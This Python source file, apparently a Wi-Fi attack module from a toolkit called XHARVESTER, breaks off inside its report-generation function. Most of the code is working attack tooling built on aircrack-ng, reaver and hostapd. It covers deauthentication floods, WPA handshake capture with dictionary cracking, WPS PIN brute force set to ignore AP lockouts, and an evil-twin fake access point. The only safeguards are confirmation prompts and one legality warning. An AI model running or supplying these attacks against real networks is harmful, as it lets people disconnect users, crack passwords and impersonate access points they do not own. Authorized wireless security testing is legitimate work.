#!/usr/bin/env python3
"""
WiFi Security Testing Module
Professional wireless network penetration testing and security assessment

Author: N3twork(GHANA) - Computer Programmer & Hacker
Version: 1.0
"""

import sys
import os
import time
import subprocess
import threading
import re
import json
from typing import List, Dict, Optional, Any, Tuple
import hashlib
import binascii

# Import application dependencies
sys.path.append(os.path.dirname(os.path.dirname(__file__)))
from config import Config, Colors
from utils import (
    SystemUtils, MenuRenderer, Logger, InputValidator, 
    Animation, error_handler
)

class WifiNetwork:
    """Represents a discovered WiFi network"""
    
    def __init__(self, essid: str, bssid: str, channel: int = 0, signal: int = 0):
        self.essid = essid
        self.bssid = bssid
        self.channel = channel
        self.signal = signal
        self.encryption = "Unknown"
        self.auth_type = "Unknown"
        self.wps_enabled = False
        self.clients = []
        self.handshakes_captured = 0
        self.vulnerabilities = []
        
    def __str__(self):
        return f"{self.essid} ({self.bssid}) - Ch:{self.channel} Sig:{self.signal}dBm"

class WifiScanner:
    """WiFi network discovery and reconnaissance"""
    
    def __init__(self):
        self.logger = Logger.get_logger("wifi_scanner")
        self.interface = None
        self.monitor_interface = None
        self.discovered_networks = {}
        
    def get_wifi_interfaces(self) -> List[str]:
        """Get available WiFi interfaces"""
        interfaces = []
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        interface = line.split()[0]
                        interfaces.append(interface)
        except Exception as e:
            self.logger.error(f"Error getting WiFi interfaces: {e}")
        
        return interfaces
    
    def enable_monitor_mode(self, interface: str) -> bool:
        """Enable monitor mode on WiFi interface"""
        try:
            print(f"{Colors.INFO}  Enabling monitor mode on {interface}...")
            
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                         capture_output=True, timeout=10)
            
            # Enable monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                                  capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                # Extract monitor interface name
                for line in result.stdout.split('\n'):
                    if 'monitor mode enabled' in line.lower():
                        # Try to extract interface name
                        match = re.search(r'(\w+mon|\w+)', line)
                        if match:
                            self.monitor_interface = f"{interface}mon"
                            break
                
                if not self.monitor_interface:
                    self.monitor_interface = f"{interface}mon"
                
                print(f"{Colors.SUCCESS}  Monitor mode enabled: {self.monitor_interface}")
                return True
            else:
                print(f"{Colors.ERROR}  Failed to enable monitor mode")
                return False
                
        except Exception as e:
            self.logger.error(f"Monitor mode error: {e}")
            print(f"{Colors.ERROR}  Monitor mode error: {e}")
            return False
    
    def disable_monitor_mode(self, interface: str) -> bool:
        """Disable monitor mode and restore managed mode"""
        try:
            print(f"{Colors.INFO}  Disabling monitor mode...")
            
            # Stop monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'stop', interface], 
                                  capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                print(f"{Colors.SUCCESS}  Monitor mode disabled")
                
                # Restart network manager
                subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                             capture_output=True, timeout=10)
                return True
            else:
                print(f"{Colors.ERROR}  Failed to disable monitor mode")
                return False
                
        except Exception as e:
            self.logger.error(f"Error disabling monitor mode: {e}")
            return False
    
    def scan_networks(self, interface: str, duration: int = 60) -> List[WifiNetwork]:
        """Scan for WiFi networks using airodump-ng"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WiFi Network Discovery")
        print(f"{Colors.INFO}  Scanning for {duration} seconds...")
        
        networks = []
        csv_file = "/tmp/airodump_scan"
        
        try:
            # Start airodump-ng scan
            cmd = [
                'sudo', 'airodump-ng', 
                '--write', csv_file,
                '--write-interval', '10',
                '--output-format', 'csv',
                interface
            ]
            
            print(f"{Colors.BLUE}  Starting network scan...")
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
            
            # Let it run for specified duration
            time.sleep(duration)
            
            # Stop the process
            process.terminate()
            time.sleep(2)
            if process.poll() is None:
                process.kill()
            
            # Parse results
            csv_filename = f"{csv_file}-01.csv"
            if os.path.exists(csv_filename):
                networks = self._parse_airodump_csv(csv_filename)
                
                # Cleanup
                for ext in ['.csv', '.kismet.csv', '.kismet.netxml']:
                    try:
                        os.remove(f"{csv_file}-01{ext}")
                    except:
                        pass
            
            print(f"\n{Colors.SUCCESS}  Found {len(networks)} WiFi networks")
            
        except Exception as e:
            self.logger.error(f"Network scan error: {e}")
            print(f"{Colors.ERROR}  Scan error: {e}")
        
        return networks
    
    def _parse_airodump_csv(self, csv_file: str) -> List[WifiNetwork]:
        """Parse airodump-ng CSV output"""
        networks = []
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Find the start of network data
            network_start = -1
            for i, line in enumerate(lines):
                if line.startswith('BSSID'):
                    network_start = i + 1
                    break
                elif line.startswith('Station MAC'):
                    break
            
            if network_start == -1:
                return networks
            
            # Parse network data
            for line in lines[network_start:]:
                if line.startswith('Station MAC') or line.strip() == '':
                    break
                
                try:
                    parts = [part.strip() for part in line.split(',')]
                    if len(parts) >= 14 and parts[0]:  # Valid BSSID
                        bssid = parts[0]
                        essid = parts[13] if parts[13] else f"Hidden_{bssid[-5:]}"
                        
                        try:
                            channel = int(parts[3]) if parts[3].isdigit() else 0
                            signal = int(parts[8]) if parts[8].lstrip('-').isdigit() else 0
                        except:
                            channel = 0
                            signal = 0
                        
                        network = WifiNetwork(essid, bssid, channel, signal)
                        
                        # Parse encryption info
                        privacy = parts[5]
                        cipher = parts[6]
                        auth = parts[7]
                        
                        if privacy == 'WEP':
                            network.encryption = 'WEP'
                        elif 'WPA2' in auth:
                            network.encryption = 'WPA2'
                        elif 'WPA' in auth:
                            network.encryption = 'WPA'
                        elif privacy == 'OPN':
                            network.encryption = 'Open'
                        
                        network.auth_type = auth
                        
                        networks.append(network)
                        self.discovered_networks[bssid] = network
                        
                        print(f"{Colors.GREEN}    • {essid[:20]:20} {bssid} Ch:{channel:2} {signal:3}dBm {network.encryption}")
                        
                except Exception as e:
                    self.logger.debug(f"Error parsing network line: {e}")
                    continue
            
        except Exception as e:
            self.logger.error(f"CSV parsing error: {e}")
        
        return networks

class WifiAttacker:
    """WiFi attack and exploitation tools"""
    
    def __init__(self):
        self.logger = Logger.get_logger("wifi_attacker")
        self.capture_dir = "/tmp/xharvester_captures"
        os.makedirs(self.capture_dir, exist_ok=True)
    
    def deauth_attack(self, interface: str, target_bssid: str, client_mac: str = None, count: int = 10) -> bool:
        """Perform deauthentication attack"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] WiFi Deauthentication Attack")
        print(f"{Colors.WARNING}  Target AP: {target_bssid}")
        if client_mac:
            print(f"{Colors.WARNING}  Target Client: {client_mac}")
        else:
            print(f"{Colors.WARNING}  Target: All clients")
        print(f"{Colors.ERROR}  ⚠️  This attack will disconnect clients from the network!")
        
        confirm = input(f"\n{Colors.GREEN}  Continue with deauth attack? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm not in ['y', 'yes']:
            print(f"{Colors.INFO}  Attack cancelled")
            return False
        
        try:
            print(f"\n{Colors.BLUE}  Launching deauth attack...")
            
            # Build aireplay-ng command
            cmd = ['sudo', 'aireplay-ng', '-0', str(count), '-a', target_bssid]
            
            if client_mac:
                cmd.extend(['-c', client_mac])
            
            cmd.append(interface)
            
            # Execute attack
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"{Colors.SUCCESS}  Deauth attack completed successfully")
                return True
            else:
                print(f"{Colors.ERROR}  Deauth attack failed")
                print(f"{Colors.WARNING}  {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"Deauth attack error: {e}")
            print(f"{Colors.ERROR}  Attack error: {e}")
            return False
    
    def handshake_capture(self, interface: str, target_bssid: str, channel: int, timeout: int = 300) -> str:
        """Capture WPA/WPA2 handshake"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WPA/WPA2 Handshake Capture")
        print(f"{Colors.INFO}  Target: {target_bssid} (Channel {channel})")
        print(f"{Colors.INFO}  Timeout: {timeout} seconds")
        
        capture_file = os.path.join(self.capture_dir, f"handshake_{target_bssid.replace(':', '')}")
        
        try:
            # Set channel
            subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], 
                         capture_output=True, timeout=10)
            
            # Start airodump-ng capture
            print(f"{Colors.BLUE}  Starting handshake capture...")
            
            cmd = [
                'sudo', 'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(channel),
                '--write', capture_file,
                '--output-format', 'pcap',
                interface
            ]
            
            # Start capture in background
            capture_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL)
            
            # Wait for handshake or timeout
            start_time = time.time()
            print(f"{Colors.YELLOW}  Waiting for handshake... (Send deauth to speed up)")
            
            while (time.time() - start_time) < timeout:
                # Check if handshake captured
                cap_file = f"{capture_file}-01.cap"
                if os.path.exists(cap_file):
                    # Verify handshake with aircrack-ng
                    verify_cmd = ['aircrack-ng', cap_file]
                    verify_result = subprocess.run(verify_cmd, capture_output=True, text=True, timeout=10)
                    
                    if 'handshake' in verify_result.stdout.lower():
                        capture_process.terminate()
                        print(f"{Colors.SUCCESS}  Handshake captured successfully!")
                        return cap_file
                
                time.sleep(5)
            
            # Timeout reached
            capture_process.terminate()
            print(f"{Colors.WARNING}  Handshake capture timeout")
            
            # Check if we got anything
            cap_file = f"{capture_file}-01.cap"
            if os.path.exists(cap_file):
                print(f"{Colors.INFO}  Capture file saved: {cap_file}")
                return cap_file
            
            return None
            
        except Exception as e:
            self.logger.error(f"Handshake capture error: {e}")
            print(f"{Colors.ERROR}  Capture error: {e}")
            return None
    
    def wps_attack(self, interface: str, target_bssid: str) -> Dict[str, Any]:
        """Perform WPS attack using reaver"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WPS Attack")
        print(f"{Colors.INFO}  Target: {target_bssid}")
        print(f"{Colors.WARNING}  This may take several hours...")
        
        results = {
            'success': False,
            'pin': None,
            'psk': None,
            'ssid': None
        }
        
        try:
            # Check if reaver is available
            result = subprocess.run(['which', 'reaver'], capture_output=True, timeout=5)
            if result.returncode != 0:
                print(f"{Colors.ERROR}  Reaver not found. Install with: sudo apt install reaver")
                return results
            
            print(f"{Colors.BLUE}  Starting WPS PIN attack...")
            
            # Build reaver command
            cmd = [
                'sudo', 'reaver',
                '-i', interface,
                '-b', target_bssid,
                '-vv',
                '-L',  # Ignore locked state
                '-N',  # Don't send NACKS
                '-d', '15',  # Delay between attempts
                '-T', '.5',  # Timeout period
                '-c', '1'   # Channel (will be auto-detected)
            ]
            
            # Start reaver attack with timeout
            print(f"{Colors.YELLOW}  WPS attack in progress (this may take hours)...")
            print(f"{Colors.INFO}  Press Ctrl+C to stop early...")
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)  # 1 hour timeout
                
                # Parse reaver output
                if result.returncode == 0 or 'WPS PIN:' in result.stdout:
                    for line in result.stdout.split('\n'):
                        if 'WPS PIN:' in line:
                            pin_match = re.search(r'WPS PIN: (\d+)', line)
                            if pin_match:
                                results['pin'] = pin_match.group(1)
                                results['success'] = True
                        elif 'WPA PSK:' in line:
                            psk_match = re.search(r'WPA PSK: (.+)', line)
                            if psk_match:
                                results['psk'] = psk_match.group(1).strip()
                        elif 'AP SSID:' in line:
                            ssid_match = re.search(r'AP SSID: (.+)', line)
                            if ssid_match:
                                results['ssid'] = ssid_match.group(1).strip()
                
                if results['success']:
                    print(f"{Colors.SUCCESS}  WPS attack successful!")
                    print(f"{Colors.GREEN}    PIN: {results['pin']}")
                    if results['psk']:
                        print(f"{Colors.GREEN}    PSK: {results['psk']}")
                else:
                    print(f"{Colors.WARNING}  WPS attack unsuccessful")
                    
            except subprocess.TimeoutExpired:
                print(f"{Colors.WARNING}  WPS attack timeout (1 hour)")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}  WPS attack interrupted by user")
        except Exception as e:
            self.logger.error(f"WPS attack error: {e}")
            print(f"{Colors.ERROR}  WPS attack error: {e}")
        
        return results
    
    def evil_twin_attack(self, interface: str, target_essid: str, target_channel: int) -> bool:
        """Create evil twin access point"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Evil Twin Attack")
        print(f"{Colors.WARNING}  Creating fake AP: {target_essid}")
        print(f"{Colors.ERROR}  ⚠️  This attack may be illegal! Use only for authorized testing!")
        
        confirm = input(f"\n{Colors.GREEN}  Continue with Evil Twin? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm not in ['y', 'yes']:
            print(f"{Colors.INFO}  Attack cancelled")
            return False
        
        try:
            # Check if hostapd is available
            result = subprocess.run(['which', 'hostapd'], capture_output=True, timeout=5)
            if result.returncode != 0:
                print(f"{Colors.ERROR}  hostapd not found. Install with: sudo apt install hostapd")
                return False
            
            # Create hostapd configuration
            config_file = "/tmp/evil_twin.conf"
            config_content = f"""interface={interface}
driver=nl80211
ssid={target_essid}
hw_mode=g
channel={target_channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
            
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            print(f"{Colors.BLUE}  Starting Evil Twin AP...")
            print(f"{Colors.INFO}  ESSID: {target_essid}")
            print(f"{Colors.INFO}  Channel: {target_channel}")
            print(f"{Colors.WARNING}  Press Ctrl+C to stop")
            
            # Start hostapd
            cmd = ['sudo', 'hostapd', config_file]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            try:
                while True:
                    output = process.stdout.readline()
                    if output:
                        if 'AP-STA-CONNECTED' in output:
                            print(f"{Colors.SUCCESS}  Client connected: {output.split()[-1]}")
                        elif 'AP-STA-DISCONNECTED' in output:
                            print(f"{Colors.INFO}  Client disconnected: {output.split()[-1]}")
                    
                    if process.poll() is not None:
                        break
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.INFO}  Stopping Evil Twin...")
                process.terminate()
                time.sleep(2)
                if process.poll() is None:
                    process.kill()
                
                # Cleanup
                try:
                    os.remove(config_file)
                except:
                    pass
                
                return True
                
        except Exception as e:
            self.logger.error(f"Evil Twin error: {e}")
            print(f"{Colors.ERROR}  Evil Twin error: {e}")
            return False
    
    def dictionary_attack(self, handshake_file: str, wordlist: str) -> Dict[str, Any]:
        """Perform dictionary attack on captured handshake"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WPA/WPA2 Dictionary Attack")
        print(f"{Colors.INFO}  Handshake: {handshake_file}")
        print(f"{Colors.INFO}  Wordlist: {wordlist}")
        
        results = {
            'success': False,
            'password': None,
            'time_taken': 0
        }
        
        if not os.path.exists(handshake_file):
            print(f"{Colors.ERROR}  Handshake file not found")
            return results
        
        if not os.path.exists(wordlist):
            print(f"{Colors.ERROR}  Wordlist file not found")
            return results
        
        try:
            print(f"{Colors.BLUE}  Starting dictionary attack...")
            start_time = time.time()
            
            # Use aircrack-ng for dictionary attack
            cmd = ['aircrack-ng', '-w', wordlist, handshake_file]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            end_time = time.time()
            results['time_taken'] = end_time - start_time
            
            # Parse aircrack-ng output
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'KEY FOUND!' in line:
                        # Extract password
                        match = re.search(r'\[ (.+) \]', line)
                        if match:
                            results['password'] = match.group(1)
                            results['success'] = True
                            break
            
            if results['success']:
                print(f"{Colors.SUCCESS}  Password found: {results['password']}")
                print(f"{Colors.INFO}  Time taken: {results['time_taken']:.2f} seconds")
            else:
                print(f"{Colors.WARNING}  Password not found in wordlist")
                print(f"{Colors.INFO}  Time taken: {results['time_taken']:.2f} seconds")
            
        except subprocess.TimeoutExpired:
            print(f"{Colors.WARNING}  Dictionary attack timeout")
            results['time_taken'] = 3600
        except Exception as e:
            self.logger.error(f"Dictionary attack error: {e}")
            print(f"{Colors.ERROR}  Attack error: {e}")
        
        return results

class WifiModule:
    """Main WiFi security testing module"""
    
    def __init__(self):
        self.logger = Logger.get_logger("wifi_module")
        self.hostname = SystemUtils.get_hostname()
        self.scanner = WifiScanner()
        self.attacker = WifiAttacker()
        self.discovered_networks = []
        self.wifi_interfaces = []
        self.current_interface = None
        
        # Check WiFi availability
        self.wifi_available = self._check_wifi_availability()
    
    def _check_wifi_availability(self) -> bool:
        """Check if WiFi hardware and tools are available"""
        try:
            # Check for WiFi interfaces
            self.wifi_interfaces = self.scanner.get_wifi_interfaces()
            if not self.wifi_interfaces:
                return False
            
            # Check for required tools
            required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
            for tool in required_tools:
                result = subprocess.run(['which', tool], capture_output=True, timeout=5)
                if result.returncode != 0:
                    return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"WiFi availability check failed: {e}")
            return False
    
    def show_menu(self):
        """Display the WiFi module menu"""
        Animation.display_banner()
        MenuRenderer.render_menu_header(f"XHARVESTER {Colors.YELLOW}-{Colors.CYAN} Wi-Fi MODULE")
        
        icons = {
            "1": "📡",
            "2": "👤",
            "3": "💥",
            "4": "🤝",
            "5": "🔓",
            "6": "👹",
            "7": "📖",
            "8": "🔧",
            "9": "📊",
            "10": "ℹ️",
            "0": "🚚"
        }
        
        menu_options = {
            "1": "Network Discovery & Scanning",
            "2": "Client Enumeration",
            "3": "Deauthentication Attack",
            "4": "WPA/WPA2 Handshake Capture",
            "5": "WPS Attack (Reaver)",
            "6": "Evil Twin Attack",
            "7": "Dictionary Attack",
            "8": "WiFi Tools & Interface Management",
            "9": "Generate Security Report",
            "10": "Module Information",
            "0": "Return to Main Menu"
        }
        
        MenuRenderer.render_menu_options(menu_options, icons)
        MenuRenderer.render_menu_footer()
    
    def network_discovery(self):
        """WiFi network discovery interface"""
        if not self.wifi_available:
            print(f"{Colors.ERROR}  WiFi not available! Please check hardware and tools.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WiFi Network Discovery")
        
        # Select interface
        if not self._select_interface():
            return
        
        try:
            # Enable monitor mode
            if not self.scanner.enable_monitor_mode(self.current_interface):
                print(f"{Colors.ERROR}  Failed to enable monitor mode")
                return
            
            duration_input = input(f"{Colors.GREEN}  Scan duration (seconds) [60]: {Colors.YELLOW}") or "60"
            duration = InputValidator.validate_integer(duration_input, 10, 600)
            
            # Perform network scan
            networks = self.scanner.scan_networks(self.scanner.monitor_interface, duration)
            self.discovered_networks = networks
            
            if networks:
                print(f"\n{Colors.MAGENTA}  Discovered Networks Summary:")
                print(f"{Colors.CYAN}  {'ESSID':<20} {'BSSID':<18} {'Ch':<3} {'Sig':<4} {'Enc':<8}")
                print(f"{Colors.CYAN}  {'-'*20} {'-'*18} {'-'*3} {'-'*4} {'-'*8}")
                
                for network in networks:
                    essid = network.essid[:19] if len(network.essid) > 19 else network.essid
                    print(f"{Colors.GREEN}  {essid:<20} {network.bssid:<18} {network.channel:<3} {network.signal:<4} {network.encryption:<8}")
            else:
                print(f"{Colors.WARNING}  No networks found")
            
            # Disable monitor mode
            self.scanner.disable_monitor_mode(self.scanner.monitor_interface)
                
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
        except Exception as e:
            print(f"{Colors.ERROR}  Discovery error: {e}")
    
    def client_enumeration(self):
        """Client enumeration interface"""
        if not self.discovered_networks:
            print(f"{Colors.WARNING}  No networks discovered. Run network discovery first.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WiFi Client Enumeration")
        
        # Select target network
        target_network = self._select_target_network()
        if not target_network:
            return
        
        try:
            # Enable monitor mode
            if not self.scanner.enable_monitor_mode(self.current_interface):
                return
            
            duration_input = input(f"{Colors.GREEN}  Monitor duration (seconds) [30]: {Colors.YELLOW}") or "30"
            duration = InputValidator.validate_integer(duration_input, 10, 300)
            
            print(f"{Colors.INFO}  Monitoring clients for {target_network.essid}...")
            print(f"{Colors.INFO}  Target: {target_network.bssid}")
            
            # Monitor clients using airodump-ng
            csv_file = "/tmp/client_enum"
            cmd = [
                'sudo', 'airodump-ng',
                '--bssid', target_network.bssid,
                '--channel', str(target_network.channel),
                '--write', csv_file,
                '--output-format', 'csv',
                self.scanner.monitor_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(duration)
            process.terminate()
            
            # Parse client data
            csv_filename = f"{csv_file}-01.csv"
            clients = self._parse_client_data(csv_filename)
            
            if clients:
                print(f"\n{Colors.SUCCESS}  Found {len(clients)} associated clients:")
                for i, client in enumerate(clients, 1):
                    print(f"{Colors.GREEN}    [{i}] {client['mac']} - {client['power']} dBm")
            else:
                print(f"{Colors.WARNING}  No clients found")
            
            # Cleanup
            for ext in ['.csv', '.kismet.csv', '.kismet.netxml']:
                try:
                    os.remove(f"{csv_file}-01{ext}")
                except:
                    pass
            
            self.scanner.disable_monitor_mode(self.scanner.monitor_interface)
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def deauth_attack(self):
        """Deauthentication attack interface"""
        if not self.discovered_networks:
            print(f"{Colors.WARNING}  No networks discovered. Run network discovery first.")
            return
        
        target_network = self._select_target_network()
        if not target_network:
            return
        
        try:
            # Enable monitor mode
            if not self.scanner.enable_monitor_mode(self.current_interface):
                return
            
            client_mac = input(f"{Colors.GREEN}  Target client MAC (or press Enter for broadcast): {Colors.YELLOW}").strip()
            if client_mac and not InputValidator.validate_mac_address(client_mac):
                raise ValueError("Invalid MAC address format")
            
            count_input = input(f"{Colors.GREEN}  Number of deauth packets [default = 0, to deauth all client]: {Colors.YELLOW}" or "0")
            count = InputValidator.validate_integer(count_input, 1, 1000)
            
            # Perform deauth attack
            success = self.attacker.deauth_attack(
                self.scanner.monitor_interface, 
                target_network.bssid, 
                client_mac if client_mac else None, 
                count
            )
            
            self.scanner.disable_monitor_mode(self.scanner.monitor_interface)
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def handshake_capture(self):
        """WPA/WPA2 handshake capture interface"""
        if not self.discovered_networks:
            print(f"{Colors.WARNING}  No networks discovered. Run network discovery first.")
            return
        
        # Filter for WPA/WPA2 networks
        wpa_networks = [n for n in self.discovered_networks if n.encryption in ['WPA', 'WPA2']]
        if not wpa_networks:
            print(f"{Colors.WARNING}  No WPA/WPA2 networks found.")
            return
        
        print(f"\n{Colors.INFO}  WPA/WPA2 Networks:")
        for i, network in enumerate(wpa_networks, 1):
            print(f"{Colors.GREEN}    [{i}] {network.essid} ({network.bssid}) - {network.encryption}")
        
        try:
            choice_input = input(f"\n{Colors.GREEN}  Select target [1]: {Colors.YELLOW}") or "1"
            choice = InputValidator.validate_integer(choice_input, 1, len(wpa_networks))
            
            target_network = wpa_networks[choice - 1]
            
            # Enable monitor mode
            if not self.scanner.enable_monitor_mode(self.current_interface):
                return
            
            timeout_input = input(f"{Colors.GREEN}  Capture timeout (seconds) [300]: {Colors.YELLOW}") or "300"
            timeout = InputValidator.validate_integer(timeout_input, 60, 3600)
            
            # Capture handshake
            handshake_file = self.attacker.handshake_capture(
                self.scanner.monitor_interface,
                target_network.bssid,
                target_network.channel,
                timeout
            )
            
            if handshake_file:
                print(f"{Colors.SUCCESS}  Handshake saved: {handshake_file}")
                
                # Ask if user wants to perform dictionary attack
                dict_attack = input(f"\n{Colors.GREEN}  Perform dictionary attack? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
                if dict_attack in ['y', 'yes']:
                    wordlist = input(f"{Colors.GREEN}  Wordlist path [/usr/share/wordlists/rockyou.txt]: {Colors.YELLOW}") or "/usr/share/wordlists/rockyou.txt"
                    if os.path.exists(wordlist):
                        results = self.attacker.dictionary_attack(handshake_file, wordlist)
                    else:
                        print(f"{Colors.ERROR}  Wordlist not found")
            
            self.scanner.disable_monitor_mode(self.scanner.monitor_interface)
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def wps_attack(self):
        """WPS attack interface"""
        if not self.discovered_networks:
            print(f"{Colors.WARNING}  No networks discovered. Run network discovery first.")
            return
        
        target_network = self._select_target_network()
        if not target_network:
            return
        
        try:
            # Enable monitor mode
            if not self.scanner.enable_monitor_mode(self.current_interface):
                return
            
            # Perform WPS attack
            results = self.attacker.wps_attack(self.scanner.monitor_interface, target_network.bssid)
            
            if results['success']:
                print(f"\n{Colors.SUCCESS}  WPS Attack Results:")
                print(f"{Colors.GREEN}    PIN: {results['pin']}")
                if results['psk']:
                    print(f"{Colors.GREEN}    Password: {results['psk']}")
                if results['ssid']:
                    print(f"{Colors.GREEN}    SSID: {results['ssid']}")
            
            self.scanner.disable_monitor_mode(self.scanner.monitor_interface)
            
        except Exception as e:
            print(f"{Colors.ERROR}  WPS attack error: {e}")
    
    def evil_twin_attack(self):
        """Evil twin attack interface"""
        if not self.discovered_networks:
            print(f"{Colors.WARNING}  No networks discovered. Run network discovery first.")
            return
        
        target_network = self._select_target_network()
        if not target_network:
            return
        
        try:
            # Enable monitor mode
            if not self.scanner.enable_monitor_mode(self.current_interface):
                return
            
            # Perform evil twin attack
            self.attacker.evil_twin_attack(
                self.scanner.monitor_interface,
                target_network.essid,
                target_network.channel
            )
            
            self.scanner.disable_monitor_mode(self.scanner.monitor_interface)
            
        except Exception as e:
            print(f"{Colors.ERROR}  Evil twin error: {e}")
    
    def dictionary_attack(self):
        """Dictionary attack interface"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WPA/WPA2 Dictionary Attack")
        
        try:
            handshake_file = input(f"{Colors.GREEN}  Handshake file path: {Colors.YELLOW}").strip()
            if not os.path.exists(handshake_file):
                print(f"{Colors.ERROR}  File not found: {handshake_file}")
                return
            
            wordlist = input(f"{Colors.GREEN}  Wordlist path [/usr/share/wordlists/rockyou.txt]: {Colors.YELLOW}") or "/usr/share/wordlists/rockyou.txt"
            if not os.path.exists(wordlist):
                print(f"{Colors.ERROR}  Wordlist not found: {wordlist}")
                return
            
            # Perform dictionary attack
            results = self.attacker.dictionary_attack(handshake_file, wordlist)
            
        except Exception as e:
            print(f"{Colors.ERROR}  Dictionary attack error: {e}")
    
    def wifi_tools(self):
        """WiFi tools and interface management"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WiFi Tools & Interface Management")
        
        # Show interfaces
        print(f"\n{Colors.MAGENTA}  Available WiFi Interfaces:")
        interfaces = self.scanner.get_wifi_interfaces()
        if interfaces:
            for i, iface in enumerate(interfaces, 1):
                print(f"{Colors.GREEN}    [{i}] {iface}")
        else:
            print(f"{Colors.WARNING}    No WiFi interfaces found")
        
        # Show required tools
        tools = [
            ('airmon-ng', 'Monitor mode management'),
            ('airodump-ng', 'WiFi network scanner'),
            ('aireplay-ng', 'WiFi attack tool'),
            ('aircrack-ng', 'WEP/WPA cracker'),
            ('reaver', 'WPS attack tool'),
            ('hostapd', 'Access point daemon'),
            ('iwconfig', 'Wireless configuration')
        ]
        
        print(f"\n{Colors.MAGENTA}  Required Tools:")
        for tool, description in tools:
            try:
                result = subprocess.run(['which', tool], capture_output=True, timeout=5)
                status = "✅" if result.returncode == 0 else "❌"
                print(f"{Colors.INFO}    {status} {tool}: {description}")
            except:
                print(f"{Colors.ERROR}    ❌ {tool}: {description}")
        
        # Interface status
        print(f"\n{Colors.MAGENTA}  Interface Status:")
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line or 'Mode:' in line:
                        print(f"{Colors.INFO}    {line.strip()}")
        except:
            print(f"{Colors.ERROR}    Failed to get interface status")
        
        # Quick commands
        print(f"\n{Colors.MAGENTA}  Quick Commands:")
        print(f"{Colors.YELLOW}    • List interfaces: iwconfig")
        print(f"{Colors.YELLOW}    • Enable monitor: sudo airmon-ng start <interface>")
        print(f"{Colors.YELLOW}    • Disable monitor: sudo airmon-ng stop <interface>mon")
        print(f"{Colors.YELLOW}    • Scan networks: sudo airodump-ng <interface>mon")
    
    def generate_report(self):
        """Generate WiFi security assessment report"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] WiFi Security Report Generation")
        
        if not self.discovered_networks:
            print(f"{Colors.WARNING}  No assessment data available. Perform scans first.")
            return
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join("reports", f"wifi_security_report_{timestamp}.txt")
        
        try:
            os.makedirs("reports", exist_ok=True)
            
            with open(report_file, 'w') as f:
                f.write("===============================================\n")
                f.write("  WIFI SECURITY ASSESSMENT REPORT\n")
                f.write("===============================================\n\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Assessor: {Config.APP_NAME} v{Config.VERSION}\n")
                f.write(f"Environment: {Config.CURRENT_PLATFORM}\n\n")
                
                f.write("DISCOVERED NETWORKS\n")
                f.write("==================\n\n")
                
                for i, network in enumerate(self.discovered_networks, 1):
                    f.write(f"[{i}] SSID: {network.essid}\n")
                    f.write(f"    BSSID: {network.bssid}\n")
                    f.write(f"    Channel: {network.channel}\n")
                    f.write(f"    Signal: {network.signal} dBm\n")
